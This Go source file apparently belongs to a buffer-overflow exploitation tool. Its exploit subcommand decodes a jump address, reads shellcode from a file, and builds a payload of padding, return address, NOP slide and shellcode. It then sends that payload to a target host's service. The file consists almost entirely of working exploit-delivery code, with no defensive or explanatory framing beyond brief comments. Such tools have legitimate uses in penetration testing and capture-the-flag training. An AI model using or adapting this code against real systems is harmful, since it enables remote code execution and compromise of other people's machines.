package overflow

import (
    "fmt"
    "net"
    "errors"
    "io/ioutil"
)

// contains exploit subcommand specific parameters
type Exploit struct {
    offset  int
    jump    string
    reverse bool
    nops    int
    shell   string
}

// creates a new exploit object to store parameters
func NewExploit(offset int, jump string, reverse bool, nops int,
        shell string) Exploit {
    return Exploit{ offset, jump, reverse, nops, shell }
}

// the main functionality of the exploit subcommand
func (e Exploit) Run(host Host, tmpl string) {
    // decode jump address
    fmt.Println(" > parsing jump address")
    addr, err := e.DecodeJumpAddr()
    if err != nil {
        fmt.Printf("\n error: %s\n", err)
        return
    }

    // read shell
    fmt.Println(" > reading shellcode")
    shell, err := ioutil.ReadFile(e.shell)
    if err != nil {
        fmt.Printf("\n error: %s\n", err)
        return
    }

    // construct exploit
    data := e.ConstructExploit(addr, shell)

    // build payload
    fmt.Println(" > building payload")
    payload := Payload{ data, tmpl }

    // send payload to target service
    fmt.Printf(" > sending %d-byte payload\n", payload.Size())
    if err = host.SendPayload(payload); err != nil {
        fmt.Printf("\n error: %s\n", err.(*net.OpError).Err)
        return
    }

    // notify user that the payload was successfully delivered
    fmt.Println("\n success: no errors found")
}

// decode the jump address
func (e Exploit) DecodeJumpAddr() ([]byte, error) {
    // check jump address is correct length
    if len(e.jump) != 16 {
        return nil, errors.New("jump addr has bad length")
    }

    // decode jump address
    addr, err := parseHex(e.jump)
    if err != nil {
        return nil, err
    }

    // reverse endianness if told to do so
    if e.reverse {
        reverseBytes(addr)
    }

    return addr, nil
}

// construct the exploit payload from the jump address and shell bytes
func (e Exploit) ConstructExploit(addr []byte, shell []byte) []byte {
    // generate overflow and nopslide
    pad := generateBytes(0x41, e.offset)
    slide := generateBytes(0x90, e.nops)

    // construct payload (pad + jump + slide + shell)
    data := append(pad, addr...)
    data = append(data, slide...)
    data = append(data, shell...)

    return data
}

